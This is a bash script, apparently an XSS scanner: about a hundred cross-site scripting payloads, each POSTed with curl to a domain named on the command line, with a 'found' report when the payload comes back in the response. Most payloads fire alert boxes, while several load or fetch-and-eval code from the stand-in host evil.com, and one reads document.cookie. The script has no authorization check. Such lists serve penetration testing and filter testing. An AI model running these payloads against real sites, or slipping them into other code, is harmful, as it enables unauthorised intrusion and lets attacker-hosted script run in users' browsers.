#!/bin/bash

# List of XSS Payloads
payloads=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "'\"><script>alert(1)</script>"
  "\"><svg onload=alert(1)>"
  "<svg><script>alert(1)</script></svg>"
  "<iframe src=javascript:alert(1)>"
  "<body onload=alert(1)>"
  "<input onfocus=alert(1) autofocus>"
  "<marquee onstart=alert(1)>"
  "<math href='javascript:alert(1)'>CLICK</math>"
  "<a href='javascript:alert(1)'>click</a>"
  "<details open ontoggle=alert(1)>"
  "<img src='x' onerror='alert(1)'>"
  "<object data='javascript:alert(1)'></object>"
  "<embed src='javascript:alert(1)'>"
  "<svg/onload=alert(1)>"
  "<img src=x onerror=prompt(1)>"
  "<video><source onerror='alert(1)'></video>"
  "<form><button formaction='javascript:alert(1)'>"
  "<link rel=stylesheet href=javascript:alert(1)>"
  "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
  "<img src=1 onerror=confirm(1)>"
  "<script>confirm(1)</script>"
  "';alert(String.fromCharCode(88,83,83))//"
  "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>"
  "\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>"
  "<script>this.onerror=alert;throw 1</script>"
  "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>"
  "<div style='width:expression(alert(1))'>"
  "<a href='data:text/html,<script>alert(1)</script>'>CLICK</a>"
  "<img src=x:alert(1) onerror=eval(src)>"
  "javascript:alert(1)"
  "data:text/html,<script>alert(1)</script>"
  "vbscript:msgbox('XSS')"
  "<!--<script>alert(1)</script>-->"
  "<!--<img src=x onerror=alert(1)>-->"
  "<script src=data:text/javascript,alert(1)></script>"
  "<script>window.onerror=alert;throw 1;</script>"
  "<style>@import'javascript:alert(1)';</style>"
  "<svg><script xlink:href=javascript:alert(1)></script></svg>"
  "<img src='data:image/svg+xml,<svg onload=alert(1)>'>"
  "<svg><style>*{x:expression(alert(1))}</style></svg>"
  "<base href='javascript:alert(1);//'>"
  "<object type='text/x-scriptlet' data='http://evil.com/xss.html'></object>"
  "<applet code='javascript:alert(1)'></applet>"
  "<img dynsrc='javascript:alert(1)' src='x'>"
  "<bgsound src='javascript:alert(1)'>"
  "<img lowsrc='javascript:alert(1)'>"
  "<meta http-equiv='set-cookie' content='XSS=alert(1)'>"
  "<img src='1' onerror='this.onerror=null;alert(1)'>"
  "<div onpointerover='alert(1)'>hover me</div>"
  "<svg><a xlink:href='javascript:alert(1)'>CLICK</a></svg>"
  "<script src=//evil.com/xss.js></script>"
  "<img src=x onerror=top.alert(1)>"
  "<video autoplay onplay=alert(1)>"
  "<img src onerror='fetch(//evil.com).then(r=>r.text().then(eval))'>"
  "<a href=javascript:eval('alert(1)')>click</a>"
  "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
  "<input type=image src onerror=alert(1)>"
  "<script>location='javascript:alert(1)'</script>"
  "');alert(document.cookie);//"
  "\" onmouseover=alert(1) x="
  "<a href='javascript:alert(1)' id='x'>click</a>"
  "<svg><animate attributeName='onload' values='alert(1)'></svg>"
  "<button onclick='alert(1)'>click</button>"
  "<img src=x onerror='alert(1)'>"
  "<input onblur=alert(1) autofocus>"
  "<form onsubmit=alert(1)><input type=submit></form>"
  "<img src=x onerror=location='javascript:alert(1)'>"
  "<script>eval('ale'+'rt(1)')</script>"
  "<input type=text value='\" onfocus=alert(1)' autofocus>"
  "<script src='data:text/javascript;base64,YWxlcnQoMSk='></script>"
  "<a href=javascript:alert(1)//click>CLICK</a>"
  "'--><script>alert(1)</script>"
  "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"
  "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>"
  "<a onclick=alert(1)>click</a>"
  "<meta charset='x' http-equiv='refresh' content='0;url=javascript:alert(1)'>"
  "<style>body{background:url('javascript:alert(1)')}</style>"
  "<input value=''';!--' onfocus=alert(1) autofocus>"
  "<script>throw new Error('XSS');</script>"
  "<iframe onload=alert(1)></iframe>"
  "<video src onerror=alert(1)>"
  "<img src onerror='this.src=\"x\";alert(1)'>"
  "<div style='background-image:url(javascript:alert(1))'>"
  "<script>alert(document.domain)</script>"
  "<script>alert(document.URL)</script>"
  "<script>alert(document.referrer)</script>"
  "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>"
  "<script id=x>alert(1)</script>"
  "<textarea autofocus onfocus=alert(1)>"
  "<svg><use href='data:image/svg+xml,<svg onload=alert(1)>'></use></svg>"
  "<meta http-equiv='refresh' content='0;url=data:text/html,<script>alert(1)</script>'>"
  "<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>"
  "<img src=x onerror=alert(1)>"
  "<a href='javascript:alert(1)'>Click me</a>"
  "<button onclick='alert(1)'>Alert</button>"
  "<input type='text' value='\" onfocus=alert(1) autofocus>"
  "<object type='application/x-javascript' data='javascript:alert(1)'></object>"
)

# Function to scan a domain for XSS
scan_xss() {
  domain=$1
  for payload in "${payloads[@]}"
  do
    echo "Scanning with payload: $payload"
    # Make a request and check for XSS vulnerability
    response=$(curl -s "$domain" --data "input=$payload")
    if [[ $response == *"$payload"* ]]; then
      echo -e "\033[0;32m[+] XSS Found: $payload\033[0m"
    else
      echo -e "\033[0;31m[-] No XSS Found for: $payload\033[0m"
    fi
  done
}

# Main script
if [[ $# -ne 1 ]]; then
  echo "Usage: ./xss_scanner.sh <domain>"
  exit 1
fi

domain=$1
scan_xss $domain
